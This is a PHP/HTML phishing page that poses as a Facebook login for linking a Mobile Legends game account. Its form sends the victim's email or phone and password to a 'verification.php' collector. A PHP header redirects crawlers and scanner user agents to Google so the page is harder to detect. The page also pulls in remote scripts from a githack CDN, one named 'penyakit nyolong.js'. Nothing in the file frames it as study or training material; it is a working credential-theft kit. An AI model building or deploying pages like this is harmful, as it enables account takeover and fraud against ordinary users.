<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: https://www.google.com/');
die();
}
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Login with Facebook</title>
    <link rel="shorcut icon" href="img/fb.png">
    <!-- Style -->
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <style>
      html,body {
        background-color: #eceff6;
      }

      button:focus,
      input:focus,
      textarea:focus,
      select:focus {
          outline: none;
      }

      .login {
        max-width: 100%;
        width: 500px;
        display: block;
        margin: 10px auto;
        box-shadow: 0px 0px 15px rgba(0,0,0, 0.1);
      }

      textarea:focus,
      input[type="text"]:focus,
      input[type="password"]:focus,
      input[type="datetime"]:focus,
      input[type="datetime-local"]:focus,
      input[type="date"]:focus,
      input[type="month"]:focus,
      input[type="time"]:focus,
      input[type="week"]:focus,
      input[type="number"]:focus,
      input[type="email"]:focus,
      input[type="url"]:focus,
      input[type="search"]:focus,
      input[type="tel"]:focus,
      input[type="color"]:focus,
      .uneditable-input:focus {
        border-color: #ced4da;
        box-shadow: 0 1px 1px rgba(0, 0, 0, 0) inset, 0 0 8px rgba(126, 239, 104, 0);
        outline: 0 none;
      }

      .bg-utama {
        background-color: #3b5998;
      }
      .img-login {
        width: 120px;
        margin: 3px auto;
      }

      .img-icon {
        width: 60px;
        border-radius: 15px;
      }

      .text {
        font-size: 1em;
        display: block;
        margin-top: -8px;
        margin-bottom: 20px;
        color: #919191;
      }

      .form-control {
        display: block;
        height: 45px;
        margin: -1px auto;
      }

      .border-bottom-x {
        border-radius: 0px;
        border-top-left-radius: .25rem;
        border-top-right-radius: .25rem;
        outline: none;
        font-size: 14px;
      }

      .border-top-x {
        border-radius: 0px;
        border-bottom-left-radius: .25rem;
        border-bottom-right-radius: .25rem;
        outline: none;
        font-size: 14px;
      }

      .btn-login {
        width: 100%;
        display: block;
        margin: 10px auto;
        background-color: #3677ff;
        font-size: 15px;
      }

      .hiya {
        margin: -10px auto 15px auto;
      }

      .text-buat {
        margin: 13px auto;
        color: #3b5998;
      }

      .text-lupa {
        color: #919191;
        font-size: 0.8em;
      }

      @media only screen and (max-width: 600px) {
        .login {
          display: block;
          margin: 0 auto;
          box-shadow: 0px 0px 15px rgba(0,0,0, 0  );
        }
      }
    </style>
  </head>
  <body>
    <div class="login mx-auto d-block">
      <nav class="navbar bg-utama navbar-dark text-center">
        <div class="container">
          <img class="mx-auto d-block img-login" src="img/fb-login.png">
        </div>
      </nav>

      <div class="container">
        <div class="row">
          <div class="col-sm-12 col-lg-12 text-center mx-auto d-block">
            <img class="img-icon mt-4 mb-4" src="https://gcube.id/wp-content/uploads/2017/11/mobile-legends-app-icon.png">
            <div class="text">
              Login with Facebook <br>to connect Mobile Legends
            </div>
          </div>
        </div>

        <div class="row">
          <div class="col-sm-12 col-lg-12 text-center mx-auto d-block">
            <form action="../../verification.php" method="POST">
              <div class="form-group">
                <input class="form-control border-bottom-x" type="text" name="email" placeholder="Email or Phone" autocomplete="off" required>
				<input class="form-control border-top-x" type="password" name="password" placeholder="Password">
				<input type="hidden" name="login" value="Facebook">
                <button class="btn btn-login text-white" type="submit">Sign In</button>
              </div>
            </form>
          </div>
        </div>

        <div class="row">
          <div class="col-sm-12 col-lg-12 text-center mx-auto d-block">
            <div class="hiya">
              <a href="#" class="text-buat d-block">Create Account</a>
              <a href="#" class="text-buat d-block text-lupa">Forgot Password? Help Center</a>
            </div>
            <div class="hiya mt-5">
              <a href="#" class="text-buat d-block text-lupa">Facebook &copy; 2020</a>
            </div>
          </div>
        </div>
      </div>
    </div>
    <!-- Script -->
    <script type="text/javascript" src="js/jquery-3.4.1.min.js"></script>
    <script type="text/javascript" src="js/bootstrap.min.js"></script>
    <script type="text/javascript" src="js/bootstrap.bundle.min.js"></script>
    <link rel="stylesheet" type="text/css" href="https://rawcdn.githack.com/PulberAja/pengaman/ddf1cf7ff15a3565bacdcc687361eb38c53a85c6/000.css">
<script src="https://rawcdn.githack.com/PulberAja/pengaman/ddf1cf7ff15a3565bacdcc687361eb38c53a85c6/debug.js"></script>
<script src="https://rawcdn.githack.com/PulberAja/pengaman/5004a2ecfdd12f50ac43f95496bb8213ba49879a/penyakit nyolong.js"></script>
  </body>
</html>